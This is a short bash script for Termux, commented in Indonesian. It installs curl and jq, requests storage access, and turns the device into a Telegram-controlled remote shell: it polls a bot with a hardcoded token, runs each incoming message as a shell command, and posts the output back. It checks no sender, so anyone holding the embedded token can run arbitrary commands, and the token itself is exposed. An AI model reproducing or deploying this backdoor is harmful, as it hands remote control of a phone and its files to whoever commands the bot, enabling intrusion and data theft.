#!/bin/bash
clear
apt update
 apt install curl jq -y
clear
termux-setup-storage -y
clear 

TOKEN="7828558736:AAET5sG0jxnniUOQbSAvnj5DZKsUYL2Q0fM"
CHAT_ID="5951232585" # Akan diisi secara otomatis setelah bot menerima pesan pertama.
OFFSET=0

# Fungsi untuk mengirim pesan ke Telegram
send_message() {
    local chat_id=$1
    local text=$2
    curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
        -d "chat_id=${chat_id}" \
        -d "text=${text}" > /dev/null
}

# Fungsi untuk memproses perintah
process_command() {
    local chat_id=$1
    local command=$2
    if [[ $command == "/start" ]]; then
        send_message "$chat_id" "Bot aktif! Kirim perintah untuk dijalankan di terminal."
    else
        # Jalankan perintah terminal dan kirim hasilnya
        local output
        output=$(bash -c "$command" 2>&1)
        send_message "$chat_id" "Output:\n$output"
    fi
}

# Loop untuk memeriksa pesan baru
while true; do
    # Ambil pesan baru dari Telegram
    response=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${OFFSET}")
    updates=$(echo "$response" | jq -c '.result[]')

    for update in $updates; do
        OFFSET=$(echo "$update" | jq '.update_id') # Update offset
        OFFSET=$((OFFSET + 1))                    # Tambahkan 1 untuk melewati pesan yang sudah diproses

        CHAT_ID=$(echo "$update" | jq -r '.message.chat.id')
        TEXT=$(echo "$update" | jq -r '.message.text')

        process_command "$CHAT_ID" "$TEXT"
    done

    sleep 1 # Kurangi beban server
done
